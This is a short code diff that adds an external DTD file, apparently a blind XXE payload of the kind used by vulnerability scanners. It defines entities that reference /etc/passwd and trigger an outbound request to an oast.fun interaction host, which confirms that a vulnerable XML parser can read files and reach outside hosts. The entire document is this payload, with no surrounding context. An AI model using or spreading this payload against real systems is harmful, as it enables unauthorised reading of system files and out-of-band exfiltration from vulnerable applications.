@@ -1,0 +1,4 @@
+<!ENTITY % file PUBLIC "f" "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil PUBLIC 'x' 'https://xbqvnbfbpqnlefpawaixdjdz8gfeokzv3.oast.fun/file-works'>">
+%eval;
+%exfil;
